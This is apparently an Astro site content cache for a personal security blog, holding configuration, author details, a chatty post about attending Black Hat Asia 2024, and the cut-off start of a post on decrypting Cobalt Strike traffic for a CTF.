[["Map",1,2,9,10,15,16,40,41,55,56,62,63,71,72],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.7.12","content-config-digest","70084eded012d0c1","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://zachwong02.github.io\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":true,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[]},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[[null,{\"themes\":[{\"colors\":{\"activityBar.activeBorder\":\"#f9826c\",\"activityBar.background\":\"#303030\",\"activityBar.border\":\"#1b1f23\",\"activityBar.foreground\":\"#e1e4e8\",\"activityBar.inactiveForeground\":\"#6a737d\",\"activityBarBadge.background\":\"#0366d6\",\"activityBarBadge.foreground\":\"#fff\",\"badge.background\":\"#044289\",\"badge.foreground\":\"#c8e1ff\",\"breadcrumb.activeSelectionForeground\":\"#d1d5da\",\"breadcrumb.focusForeground\":\"#e1e4e8\",\"breadcrumb.foreground\":\"#959da5\",\"breadcrumbPicker.background\":\"#2b3036\",\"button.background\":\"#176f2c\",\"button.foreground\":\"#dcffe4\",\"button.hoverBackground\":\"#22863a\",\"button.secondaryBackground\":\"#444d56\",\"button.secondaryForeground\":\"#fff\",\"button.secondaryHoverBackground\":\"#586069\",\"checkbox.background\":\"#444d56\",\"checkbox.border\":\"#1b1f23\",\"debugToolBar.background\":\"#2b3036\",\"descriptionForeground\":\"#959da5\",\"diffEditor.insertedTextBackground\":\"#28a74530\",\"diffEditor.removedTextBackground\":\"#d73a4930\",\"dropdown.background\":\"#2f363d\",\"dropdown.border\":\"#1b1f23\",\"dropdown.foreground\":\"#e1e4e8\",\"dropdown.listBackground\":\"#24292e\",\"editor.background\":\"#202020\",\"editor.findMatchBackground\":\"#ffd33d44\",\"editor.findMatchHighlightBackground\":\"#ffd33d22\",\"editor.focusedStackFrameHighlightBackground\":\"#2b6a3033\",\"editor.foldBackground\":\"#58606915\",\"editor.foreground\":\"#e1e4e8\",\"editor.inactiveSelectionBackground\":\"#3392FF22\",\"editor.lineHighlightBackground\":\"#2b3036\",\"editor.linkedEditingBackground\":\"#3392FF22\",\"editor.selectionBackground\":\"#3392FF44\",\"editor.selectionHighlightBackground\":\"#17E5E633\",\"editor.selectionHighlightBorder\":\"#17E5E600\",\"editor.stackFrameHighlightBackground\":\"#C6902625\",\"editor.wordHighlightBackground\":\"#17E5E600\",\"editor.wordHighlightBorder\":\"#17E5E699\",\"editor.wordHighlightStrongBackground\":\"#17E5E600\",\"editor.wordHighlightStrongBorder\":\"#17E5E666\",\"editorBracketHighlight.foreground1\":\"#79b8ff\",\"editorBracketHighlight.foreground2\":\"#ffab70\",\"editorBracketHighlight.foreground3\":\"#b392f0\",\"editorBracketHighlight.foreground4\":\"#79b8ff\",\"editorBracketHighlight.foreground5\":\"#ffab70\",\"editorBracketHighlight.foreground6\":\"#b392f0\",\"editorBracketMatch.background\":\"#17E5E650\",\"editorBracketMatch.border\":\"#17E5E600\",\"editorCursor.foreground\":\"#c8e1ff\",\"editorError.foreground\":\"#f97583\",\"editorGroup.border\":\"#1b1f23\",\"editorGroupHeader.tabsBackground\":\"#282828\",\"editorGroupHeader.tabsBorder\":\"#1b1f23\",\"editorGutter.addedBackground\":\"#28a745\",\"editorGutter.deletedBackground\":\"#ea4a5a\",\"editorGutter.modifiedBackground\":\"#2188ff\",\"editorIndentGuide.activeBackground\":\"#444d56\",\"editorIndentGuide.background\":\"#2f363d\",\"editorLineNumber.activeForeground\":\"#e1e4e8\",\"editorLineNumber.foreground\":\"#444d56\",\"editorOverviewRuler.border\":\"#1b1f23\",\"editorWarning.foreground\":\"#ffea7f\",\"editorWhitespace.foreground\":\"#444d56\",\"editorWidget.background\":\"#1f2428\",\"errorForeground\":\"#f97583\",\"focusBorder\":\"#005cc5\",\"foreground\":\"#d1d5da\",\"gitDecoration.addedResourceForeground\":\"#34d058\",\"gitDecoration.conflictingResourceForeground\":\"#ffab70\",\"gitDecoration.deletedResourceForeground\":\"#ea4a5a\",\"gitDecoration.ignoredResourceForeground\":\"#6a737d\",\"gitDecoration.modifiedResourceForeground\":\"#79b8ff\",\"gitDecoration.submoduleResourceForeground\":\"#6a737d\",\"gitDecoration.untrackedResourceForeground\":\"#34d058\",\"input.background\":\"#2f363d\",\"input.border\":\"#1b1f23\",\"input.foreground\":\"#e1e4e8\",\"input.placeholderForeground\":\"#959da5\",\"list.activeSelectionBackground\":\"#39414a\",\"list.activeSelectionForeground\":\"#e1e4e8\",\"list.focusBackground\":\"#044289\",\"list.hoverBackground\":\"#282e34\",\"list.hoverForeground\":\"#e1e4e8\",\"list.inactiveFocusBackground\":\"#1d2d3e\",\"list.inactiveSelectionBackground\":\"#282e34\",\"list.inactiveSelectionForeground\":\"#e1e4e8\",\"notificationCenterHeader.background\":\"#24292e\",\"notificationCenterHeader.foreground\":\"#959da5\",\"notifications.background\":\"#2f363d\",\"notifications.border\":\"#1b1f23\",\"notifications.foreground\":\"#e1e4e8\",\"notificationsErrorIcon.foreground\":\"#ea4a5a\",\"notificationsInfoIcon.foreground\":\"#79b8ff\",\"notificationsWarningIcon.foreground\":\"#ffab70\",\"panel.background\":\"#202020\",\"panel.border\":\"#1b1f23\",\"panelInput.border\":\"#2f363d\",\"panelTitle.activeBorder\":\"#f9826c\",\"panelTitle.activeForeground\":\"#e1e4e8\",\"panelTitle.inactiveForeground\":\"#959da5\",\"peekViewEditor.background\":\"#1f242888\",\"peekViewEditor.matchHighlightBackground\":\"#ffd33d33\",\"peekViewResult.background\":\"#1f2428\",\"peekViewResult.matchHighlightBackground\":\"#ffd33d33\",\"pickerGroup.border\":\"#444d56\",\"pickerGroup.foreground\":\"#e1e4e8\",\"progressBar.background\":\"#0366d6\",\"quickInput.background\":\"#24292e\",\"quickInput.foreground\":\"#e1e4e8\",\"scrollbar.shadow\":\"#0008\",\"scrollbarSlider.activeBackground\":\"#6a737d88\",\"scrollbarSlider.background\":\"#6a737d33\",\"scrollbarSlider.hoverBackground\":\"#6a737d44\",\"settings.headerForeground\":\"#e1e4e8\",\"settings.modifiedItemIndicator\":\"#0366d6\",\"sideBar.background\":\"#1f2428\",\"sideBar.border\":\"#1b1f23\",\"sideBar.foreground\":\"#d1d5da\",\"sideBarSectionHeader.background\":\"#1f2428\",\"sideBarSectionHeader.border\":\"#1b1f23\",\"sideBarSectionHeader.foreground\":\"#e1e4e8\",\"sideBarTitle.foreground\":\"#e1e4e8\",\"statusBar.background\":\"#303030\",\"statusBar.border\":\"#1b1f23\",\"statusBar.debuggingBackground\":\"#931c06\",\"statusBar.debuggingForeground\":\"#fff\",\"statusBar.foreground\":\"#d1d5da\",\"statusBar.noFolderBackground\":\"#24292e\",\"statusBarItem.prominentBackground\":\"#282e34\",\"statusBarItem.remoteBackground\":\"#303030\",\"statusBarItem.remoteForeground\":\"#d1d5da\",\"tab.activeBackground\":\"#303030\",\"tab.activeBorder\":\"#24292e\",\"tab.activeBorderTop\":\"#f9826c\",\"tab.activeForeground\":\"#e1e4e8\",\"tab.border\":\"#1b1f23\",\"tab.hoverBackground\":\"#24292e\",\"tab.inactiveBackground\":\"#1f2428\",\"tab.inactiveForeground\":\"#959da5\",\"tab.unfocusedActiveBorder\":\"#24292e\",\"tab.unfocusedActiveBorderTop\":\"#1b1f23\",\"tab.unfocusedHoverBackground\":\"#24292e\",\"terminal.ansiBlack\":\"#586069\",\"terminal.ansiBlue\":\"#2188ff\",\"terminal.ansiBrightBlack\":\"#959da5\",\"terminal.ansiBrightBlue\":\"#79b8ff\",\"terminal.ansiBrightCyan\":\"#56d4dd\",\"terminal.ansiBrightGreen\":\"#85e89d\",\"terminal.ansiBrightMagenta\":\"#b392f0\",\"terminal.ansiBrightRed\":\"#f97583\",\"terminal.ansiBrightWhite\":\"#fafbfc\",\"terminal.ansiBrightYellow\":\"#ffea7f\",\"terminal.ansiCyan\":\"#39c5cf\",\"terminal.ansiGreen\":\"#34d058\",\"terminal.ansiMagenta\":\"#b392f0\",\"terminal.ansiRed\":\"#ea4a5a\",\"terminal.ansiWhite\":\"#d1d5da\",\"terminal.ansiYellow\":\"#ffea7f\",\"terminal.foreground\":\"#d1d5da\",\"terminal.tab.activeBorder\":\"#f9826c\",\"terminalCursor.background\":\"#586069\",\"terminalCursor.foreground\":\"#79b8ff\",\"textBlockQuote.background\":\"#24292e\",\"textBlockQuote.border\":\"#444d56\",\"textCodeBlock.background\":\"#2f363d\",\"textLink.activeForeground\":\"#c8e1ff\",\"textLink.foreground\":\"#79b8ff\",\"textPreformat.foreground\":\"#d1d5da\",\"textSeparator.foreground\":\"#586069\",\"titleBar.activeBackground\":\"#303030\",\"titleBar.activeForeground\":\"#e1e4e8\",\"titleBar.border\":\"#1b1f23\",\"titleBar.inactiveBackground\":\"#1f2428\",\"titleBar.inactiveForeground\":\"#959da5\",\"tree.indentGuidesStroke\":\"#2f363d\",\"welcomePage.buttonBackground\":\"#2f363d\",\"welcomePage.buttonHoverBackground\":\"#444d56\"},\"displayName\":\"GitHub Dark\",\"name\":\"Spectre Dark\",\"semanticHighlighting\":true,\"tokenColors\":[{\"scope\":[\"comment\",\"punctuation.definition.comment\",\"string.comment\"],\"settings\":{\"foreground\":\"#6a737d\"}},{\"scope\":[\"constant\",\"entity.name.constant\",\"variable.other.constant\",\"variable.other.enummember\",\"variable.language\"],\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":[\"entity\",\"entity.name\"],\"settings\":{\"foreground\":\"#b392f0\"}},{\"scope\":\"variable.parameter.function\",\"settings\":{\"foreground\":\"#e1e4e8\"}},{\"scope\":\"entity.name.tag\",\"settings\":{\"foreground\":\"#85e89d\"}},{\"scope\":\"keyword\",\"settings\":{\"foreground\":\"#f97583\"}},{\"scope\":[\"storage\",\"storage.type\"],\"settings\":{\"foreground\":\"#f97583\"}},{\"scope\":[\"storage.modifier.package\",\"storage.modifier.import\",\"storage.type.java\"],\"settings\":{\"foreground\":\"#e1e4e8\"}},{\"scope\":[\"string\",\"punctuation.definition.string\",\"string punctuation.section.embedded source\"],\"settings\":{\"foreground\":\"#9ecbff\"}},{\"scope\":\"support\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"meta.property-name\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"variable\",\"settings\":{\"foreground\":\"#ffab70\"}},{\"scope\":\"variable.other\",\"settings\":{\"foreground\":\"#e1e4e8\"}},{\"scope\":\"invalid.broken\",\"settings\":{\"fontStyle\":\"italic\",\"foreground\":\"#fdaeb7\"}},{\"scope\":\"invalid.deprecated\",\"settings\":{\"fontStyle\":\"italic\",\"foreground\":\"#fdaeb7\"}},{\"scope\":\"invalid.illegal\",\"settings\":{\"fontStyle\":\"italic\",\"foreground\":\"#fdaeb7\"}},{\"scope\":\"invalid.unimplemented\",\"settings\":{\"fontStyle\":\"italic\",\"foreground\":\"#fdaeb7\"}},{\"scope\":\"carriage-return\",\"settings\":{\"background\":\"#f97583\",\"content\":\"^M\",\"fontStyle\":\"italic underline\",\"foreground\":\"#24292e\"}},{\"scope\":\"message.error\",\"settings\":{\"foreground\":\"#fdaeb7\"}},{\"scope\":\"string variable\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":[\"source.regexp\",\"string.regexp\"],\"settings\":{\"foreground\":\"#dbedff\"}},{\"scope\":[\"string.regexp.character-class\",\"string.regexp constant.character.escape\",\"string.regexp source.ruby.embedded\",\"string.regexp string.regexp.arbitrary-repitition\"],\"settings\":{\"foreground\":\"#dbedff\"}},{\"scope\":\"string.regexp constant.character.escape\",\"settings\":{\"fontStyle\":\"bold\",\"foreground\":\"#85e89d\"}},{\"scope\":\"support.constant\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"support.variable\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"meta.module-reference\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"punctuation.definition.list.begin.markdown\",\"settings\":{\"foreground\":\"#ffab70\"}},{\"scope\":[\"markup.heading\",\"markup.heading entity.name\"],\"settings\":{\"fontStyle\":\"bold\",\"foreground\":\"#79b8ff\"}},{\"scope\":\"markup.quote\",\"settings\":{\"foreground\":\"#85e89d\"}},{\"scope\":\"markup.italic\",\"settings\":{\"fontStyle\":\"italic\",\"foreground\":\"#e1e4e8\"}},{\"scope\":\"markup.bold\",\"settings\":{\"fontStyle\":\"bold\",\"foreground\":\"#e1e4e8\"}},{\"scope\":[\"markup.underline\"],\"settings\":{\"fontStyle\":\"underline\"}},{\"scope\":[\"markup.strikethrough\"],\"settings\":{\"fontStyle\":\"strikethrough\"}},{\"scope\":\"markup.inline.raw\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":[\"markup.deleted\",\"meta.diff.header.from-file\",\"punctuation.definition.deleted\"],\"settings\":{\"background\":\"#86181d\",\"foreground\":\"#fdaeb7\"}},{\"scope\":[\"markup.inserted\",\"meta.diff.header.to-file\",\"punctuation.definition.inserted\"],\"settings\":{\"background\":\"#144620\",\"foreground\":\"#85e89d\"}},{\"scope\":[\"markup.changed\",\"punctuation.definition.changed\"],\"settings\":{\"background\":\"#c24e00\",\"foreground\":\"#ffab70\"}},{\"scope\":[\"markup.ignored\",\"markup.untracked\"],\"settings\":{\"background\":\"#79b8ff\",\"foreground\":\"#2f363d\"}},{\"scope\":\"meta.diff.range\",\"settings\":{\"fontStyle\":\"bold\",\"foreground\":\"#b392f0\"}},{\"scope\":\"meta.diff.header\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":\"meta.separator\",\"settings\":{\"fontStyle\":\"bold\",\"foreground\":\"#79b8ff\"}},{\"scope\":\"meta.output\",\"settings\":{\"foreground\":\"#79b8ff\"}},{\"scope\":[\"brackethighlighter.tag\",\"brackethighlighter.curly\",\"brackethighlighter.round\",\"brackethighlighter.square\",\"brackethighlighter.angle\",\"brackethighlighter.quote\"],\"settings\":{\"foreground\":\"#d1d5da\"}},{\"scope\":\"brackethighlighter.unmatched\",\"settings\":{\"foreground\":\"#fdaeb7\"}},{\"scope\":[\"constant.other.reference.link\",\"string.other.link\"],\"settings\":{\"fontStyle\":\"underline\",\"foreground\":\"#dbedff\"}}],\"type\":\"dark\"}]}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"responsiveImages\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false},\"legacy\":{\"collections\":false}}","tags",["Map",11,12],"guide",{"id":11,"data":13,"filePath":14},{"id":11},"src/content/tags.json","quickInfo",["Map",17,18,26,27,33,34],"1",{"id":17,"data":19,"filePath":25},{"id":20,"icon":21,"text":24},1,{"type":22,"name":23},"lucide","bug","Red Teamer","src/content/info.json","2",{"id":26,"data":28,"filePath":25},{"id":29,"icon":30,"text":32},2,{"type":22,"name":31},"shield","Blue Teamer","3",{"id":33,"data":35,"filePath":25},{"id":36,"icon":37,"text":39},3,{"type":22,"name":38},"search","Malware Analyst","socials",["Map",17,42,26,49],{"id":17,"data":43,"filePath":48},{"id":20,"icon":44,"text":46,"link":47},{"type":22,"name":45},"github","GitHub","https://github.com/zachwong02","src/content/socials.json",{"id":26,"data":50,"filePath":48},{"id":29,"icon":51,"text":53,"link":54},{"type":22,"name":52},"linkedin","LinkedIn","https://www.linkedin.com/in/zachwong02/","certifications",["Map",17,57],{"id":17,"data":58,"filePath":61},{"id":20,"certificate":59,"issued":60},"Offensive Security Certified Professional (OSCP)","Issued On: October 11, 2024","src/content/certs.json","other",["Map",64,65],"about",{"id":64,"data":66,"body":67,"filePath":68,"digest":69,"deferredRender":70},{},"konnichiwa! I’m Zach, a purple teamer, CTF enthusiast, and a CTF challenge creator! I’m fascinated by all things IT, and I live by the motto: “A jack of all trades is a master of none, but oftentimes better than a master of one.” My passion includes building labs that are full of vulnerabilities and CVEs, and I love to test their limits by simulating attacks on it. After that I like to take a look at what artefacts are left behind through digital forensics.","src/content/other/about.mdx","a1a78f9c726f5174",true,"posts",["Map",73,74,91,92,112,113,127,128,144,145],"blackhat-asia-2024",{"id":73,"data":75,"body":86,"filePath":87,"assetImports":88,"digest":90,"deferredRender":70},{"title":76,"createdAt":77,"description":78,"tags":79,"draft":84,"image":85},"My Experience at Black Hat Asia 2024",["Date","2024-04-19T16:00:00.000Z"],"Black Hat Asia 2024 is a premier cybersecurity event where professionals gather to explore cutting-edge trends, learn from industry experts, and share insights on the future of digital security.",[80,82],{"id":81,"collection":9},"event",{"id":83,"collection":9},"archive",false,"__ASTRO_IMAGE_../assets/blackhat-asia-2024/featured.png","So, Black Hat Asia 2024! A huge conference packed with cybersecurity booths and fascinating talks. I should mention, though, that the ticket price was… well, let’s just say it wasn’t cheap. Luckily, Black Hat offers sponsorships for students! And so, with my assignments piling up and my final year project nowhere near done, I irresponsibly decided to sign up for it anyway!\n\n![Image of the email of my sponsorship](../assets/blackhat-asia-2024/email.png)\n\nAnd guess what? I **got it**!\n\n## One Sponsorship Is Luck, Two Is Manifest Destiny\n\n![Image of a Discord conversation](../assets/blackhat-asia-2024/discord.png)\n\nHow did I find out I was sponsored? Well, **Mr [Ahmad Ashraff](https://www.linkedin.com/in/yappare/)** or **Mr Yapp** from Malaysia Cybersecurity Camp (MCC) casually asked the group about who gotten the sponsorship. That’s when it hit me. I hadn’t even checked my email. As someone who NEVER checks their emails, I thought, “I should probably start doing that more often.”\n\n> *Remember MCC2023? No? READ MY BLOG ABOUT MY EXPERIENCE THERE!!*\n\nYou won’t believe it, but Mr. Yapp kindly sponsored transportation and accommodation for me and 4 other MCC Alumni to attend **Black Hat 2024**! I can’t even describe how grateful I am. Getting a sponsorship for **Black Hat Asia** was already a dream come true, but knowing that **transportation** and **accommodation** were both taken care of? That just blew my mind. Thank you so, so much to **Mr. Yapp** and **RE:HACK** for this incredible opportunity!\n\n## Day 1: No Booth Was Safe\n\n![Image of a joke about hacking conferences](../assets/blackhat-asia-2024/joke.jpg)\n\nYou won’t believe this funny moment from two weeks before the conference! I was giggling at a joke I had in mind for my Instagram about Black Hat. It felt too good not to share! Here it is!\n\n\n###  MCC Takes Over Black Hat Asia\n\nAnyway, on the first day, the first thought that popped into my mind was **SWAGS, SWAGS, SWAGS!!!** Let’s be real, with **Black Hat Asia** being such a huge event, it meant one thing, **a ton of popular companies** giving out their swags. But, **hold on**, before I dive into that, I met up with the MCC gang!\n\n![Image of me and the MCC gang](../assets/blackhat-asia-2024/mcc-peeps.jpg)\n\nFrom the left:\n\n1. [Teng](https://www.linkedin.com/in/wang-teng-zheng-1b176a1a6/)\n2. [Naqib](https://www.linkedin.com/in/naqib-fitri/)\n3. [Sarah](https://www.linkedin.com/in/sarahmjufri/)\n4. [Amin](https://www.linkedin.com/in/amin-safri-a4a934221/)\n5. [Invisible Amir](https://www.linkedin.com/in/ymiir/) \n\n> *Amir was also sponsored by Black Hat but he covered his own transportation & accommodation*\n\nAfter a successful swag hunt, I was thrilled to meet **[Prashanth Krishnappa](https://www.linkedin.com/in/cy102/)** from **[Cyber Cohesion](https://www.linkedin.com/company/cyber-cohesion-theunitedfront/)**! This encounter was a highlight for sure. Prashanth recognised me because of Cyber Cohesion’s recent partnership with my university’s cybersecurity club, **FSEC-SS** (shoutout to **[Roheen](https://www.linkedin.com/in/roheender-sahota/)** for facilitating that!). He even mentioned he had seen my work, particularly my segment at **SherpaSec** on **Velociraptor**. It was great to finally meet him, and our conversation about cybersecurity was truly enjoyable!\n\n### Bricking Bad\n\n![Image of an incomplete Lego art piece](../assets/blackhat-asia-2024/incomplete-lego-artpiece.jpg)\n\nLego comes from the Danish term meaning “play well,” and let me tell you, we did just that! At Black Hat, there’s a dedicated area where everyone pitches in to build a Lego art piece together.\n\n![Image of how we contributed to the Lego art piece](../assets/blackhat-asia-2024/building-the-lego-artpiece.jpg)\n\nWe were provided with a paper showcasing a grid filled with colour IDs and a black Lego piece. Our objective was to fill in the Lego piece using individual pixels that matched the art piece.\n\n![Image of the Lego prizes](../assets/blackhat-asia-2024/lego-prizes.jpg)\n\nEach segment constructed by participants is counted as an entry to win one of these awesome Lego sets!\n\nIn short, we didn’t win the lucky draw. But just before the excitement kicked in, I asked **[Dave Schefcik](https://www.linkedin.com/in/daveschefcik/)**, the station manager, about his artwork. He told me it could be worth about $45,000 USD, if not more! Once it’s finished, it will be showcased in a Black Hat office, either in the USA or Singapore. Here’s how I reacted when I heard that:\n\n>**Me:** Hopefully it won't break during shipping\n>\n>**Dave:** Oh it will... It will...\n\nAlso, he’s going to be creating the same art piece at **Black Hat USA**, which will be four times bigger! The exciting part? He shared what his real job is, and I was left thinking, **“YOU HAVE EVERYBODY’S DREAM JOB!”** He works for a custom Lego building company named Brick Nerd as his side gig, his main job title is director at a cybersecurity company!\n\nSo, I had a chance to ask him about the custom **Black Hat** Lego set because, let’s be real, I needed to know if I could get one. He explained how much work went into it, beyond just the custom stickers and packaging. The goal was to design a set that looked like something Lego themselves would’ve produced, and pulling that off required an almost terrifying level of precision. This wasn’t just some random pile of bricks, it had custom everything, from the box to the details on individual pieces. Between that level of craftsmanship and the labour involved in getting it just right, it’s no surprise the cost is way up there.\n\nThe part that blew me away about the custom Lego set? **The black hat**. One single piece in the set that happens to be the most expensive thing. Not because it’s linked to the conference, but because Lego only made that specific piece one time. To get enough of them, he had to hunt them down in the **Lego black market** (yes, that’s real). They cost **$5** each when he found them, and now they’ve gone up to **$7**. For a piece of plastic smaller than a coin. Respect to the hat for its status, but wow, that’s a grudge-worthy price hike.\n\n\n![Image of the Lego prizes](../assets/blackhat-asia-2024/completed-lego-artpiece.jpg)\n\nThe most mind-blowing part came after we wrapped up the art piece. Dave started casually pointing out misplaced Lego pieces, leaving Teng curious about how he could spot them. Me? I was slightly drunk and feeling brave (thanks to one beer and two different wines), so I just flat-out asked him. Turns out, Dave had spent an insane amount of time staring at the image. Apparently, he was the one who designed it, imported it into Photoshop, and matched each Lego piece to the exact colours in the design pixel by pixel.\n\nAbsolutely wild. The whole process of building it was a blast, and if **Black Hat** gets the chance to bring this back, they have to. It made the conference so much more entertaining and interactive.\n\n### Good Samaritan\n\n![Image of the Github stickers](../assets/blackhat-asia-2024/github-microsoft-stickers.jpg)\n\n\"Good Samaritan\" might not be the best description, but we (the MCC gang) met a really kind guy from Zimbabwe named [Blessing](https://www.linkedin.com/in/blessing-mufaro-kashava/). He gave us his take on the cybersecurity environment in Zimbabwe, and we had an engaging discussion about culture, cybersecurity, and university life. At the end, he mentioned he’s an ambassador for GitHub and Microsoft, and then he excitedly pulled out a bag filled with GitHub and Microsoft swag. Here’s how the exchange went:\n\n> **Blessing:** Oh take it, i have a whole box full of it!\n> \n> **Me:** Can i give you my address, so you can ship it to me? 🤣🤣\n\n![Image of Blessing and the MCC gang](../assets/blackhat-asia-2024/blessing.jpg)\n\nRegardless, he was such a genuinely kind person, and and the MCC team is in full agreement: **WE HAVE TO PROTECT HIM AT ALL COSTS!**\n\n![Image of the Github stickers](../assets/blackhat-asia-2024/swags.jpg)\n\nHere's today's bounty! By the end of the first day, I was genuinely excited and didn't want to leave. It was such a contrast to the conferences we had back in Malaysia! I’ll keep the details to myself, but let’s just say I learned a lot from the **Black Hat** community.\n\n### Alcohol: The Ultimate Social Engineering Tool\n\n![gulp gulp gulp](../assets/blackhat-asia-2024/tipsy.png)\n\nFor those who know me well, I’m not an extrovert; I’m just a bit confident and can be quite loud. But as you may have seen in the Lego section, alcohol tends to draw out my extroverted tendencies. After the conference, **[Belinda](https://www.linkedin.com/in/belinda-choong-0a1762b/)** invited us MCC folks to a bar for drinks and socialising!\n\n![That's CRAZYYY](../assets/blackhat-asia-2024/crazy.jpeg)\n\nBefore diving into the fun, I should mention that the bar was quite hidden. Teng and I felt like drug addicts searching for drugs trying to find it. But we eventually succeeded! So, what did we discuss once we were there? After five beers, here’s what I remember.\n\nI had the opportunity to meet an Industrial Control Systems (ICS) hacker from France, **[Faiz](https://www.linkedin.com/in/faiz-djellouli-015a2782/)**, who runs a company specialising in ICS security! He shared an incredible image of a simulation demonstrating the Stuxnet attack on a real Siemens Programmable Logic Controller (PLC) and displayed a picture of them executing a hack on a boat. Additionally, he provided fantastic advice on where to begin learning ICS hacking via blogs, YouTube, books, and even constructing a miniature ICS setup. This closely aligns with how I approach learning!\n\nI also met **[Sn0rkY](https://www.linkedin.com/in/joffreyczarny/)**, who is also from France! He's a red team leader who has accumulated over 20 years of cybersecurity experience. It was captivating to discuss how things have evolved, especially before the existence of CTFs. Back then, they had to build and buy their own labs. Nowadays, the younger generation simply spins up AWS instances. Intrigued, I asked him about Command and Control (C2) servers and what types they utilise.\n\nHis insights were quite revealing. He explained that they often start with popular C2 tools such as Cobalt Strike, Havoc, and Sliver. If these tools are flagged, they switch profiles, if that doesn’t work, they proceed to develop custom C2 servers. Ultimately, they tailor their approach to meet the client’s needs, as there’s no sense in creating a custom C2 that will be detected. They begin with widely-used tools and escalate their tactics as necessary.\n\n## Day 2: Return of the Merch Goblin\n\n### The Great Yo-Yo Heist of 2024\n\n![Image of Synk's Yo-Yo](../assets/blackhat-asia-2024/synk-yoyo.jpg)\n\n![Image of BugCrowd's Yo-Yo](../assets/blackhat-asia-2024/bugcrowd-yoyo.jpg)\n\n\nThe highlight for Day 2 at Black Hat Asia was undoubtedly the rare yoyos! These exclusive items, made by **[Snyk](https://www.linkedin.com/company/snyk/)** and **[Bugcrowd](https://www.linkedin.com/company/bugcrowd/)**, were scarce. I was lucky enough to get two of each and shared one of each with Roheen and Teng.\n\n### “Man in the Middle,” But Make It Lego\n\n![Image of my Lego creation](../assets/blackhat-asia-2024/mitm.jpg)\n\nRemember the Lego lucky draw? Well, there’s an exciting contest now for 5 more limited edition **Black Hat** Lego sets! The challenge is to create something imaginative with Lego around a specific theme. Entries are judged on their appearance, creativity, and storyline. I managed to win in the second round! My theme was **“Man in the Middle”** and I built a bridge with a figure walking in the middle of it.\n\n![Image of the custom Blackhat Lego set](../assets/blackhat-asia-2024/blackhat-lego.jpg)\n\nAh yes, set your eyes on the majestic Lego set! \n\n\n### Gotta Network Them All\n\n![Image of Moataz Salah](../assets/blackhat-asia-2024/moataz-salah.jpg)\n\nBesides the custom Lego set, there was a swag restock! As usual, I picked up a ton to share with my friends. The buzz around the swag added to the excitement. I enjoyed chats with quite a few people, including **[Moataz Salah](https://www.linkedin.com/in/moataz-salah-aa861510/)**, the CEO of **[CyberTalents](https://www.linkedin.com/company/cybertalent/)**, a CTF platform. He was enthusiastic about his platform and wanted feedback, which I found encouraging. I’m looking forward to diving deeper into what CyberTalents offers. They also organised a CTF for Black Hat, and the challenges were fairly impressive. I’d love to join again if I can.\n\n![Image of Louis and Belinda with the MCC gang](../assets/blackhat-asia-2024/louis_and_belinda.jpeg)\n\nThanks to Belinda, who I’m really thankful for, we were introduced to three more people at the conference! One of them was **[Louis](https://www.linkedin.com/in/louis-hur-87313019/)**, an ICS hacker from South Korea! Another introduction was to **[Ashley](https://www.linkedin.com/in/ashley-shen/)**, who works at Cisco. I didn’t get a chance to connect with them, but I hope to chat about their research and work in the future. The last person we met was **[Laurie](https://www.linkedin.com/in/lauriemercer/)** from HackerOne. I always thought HackerOne was just a bug bounty site, but I learned they also have a CTF platform! The neat thing is that this platform helps users learn about bug bounty hunting through challenges, and every completed challenge enhances a hacker’s reputation on HackerOne, potentially leading to private programs.\n\n## Closing Thoughts: The Swags\n\n![fine shyt](../assets/blackhat-asia-2024/fine-shyt.png)\n\nWhen the conference ended, I was filled with happiness and excitement. Was it mainly because of the swags? Well, that was nice, but the real highlight was the incredible people I met and reconnected with. I felt a true sense of belonging to a **REAL** community that encourages knowledge sharing and learning.\n\nI learned a great deal from my peers and also from booth representatives who were excited to share their insights with us, even knowing we were just students. Their passion was uplifting. To me, that’s what defines a cybersecurity community: sharing knowledge, learning from others, and maybe the swags too! 🤣🤣","src/content/posts/blackhat-asia-2024.mdx",[89],"../assets/blackhat-asia-2024/featured.png","7f4bf6a350dfe6f3","decrypting-cobalt-strike-traffic",{"id":91,"data":93,"body":107,"filePath":108,"assetImports":109,"digest":111,"deferredRender":70},{"title":94,"createdAt":95,"description":96,"tags":97,"draft":84,"image":106},"Decrypting Cobalt Strike Traffic",["Date","2024-05-11T16:00:00.000Z"],"This CTF challenge creation guide explores techniques to analyse and uncover encrypted communication between Cobalt Strike and its beacons",[98,100,102,104],{"id":99,"collection":9},"lab",{"id":101,"collection":9},"red team",{"id":103,"collection":9},"blue team",{"id":105,"collection":9},"digital forensics","__ASTRO_IMAGE_../assets/decrypting-cobalt-strike-traffic/featured.png","## Introduction\n\nOn the 11th of May 2024, Asia Pacific University's Forensic & Cybersecurity Research Centre Student Section hosted an internal CTF! As a contingency, in case I get busy with assignments and my final year project, I prepared my challenges in advance. However, being my 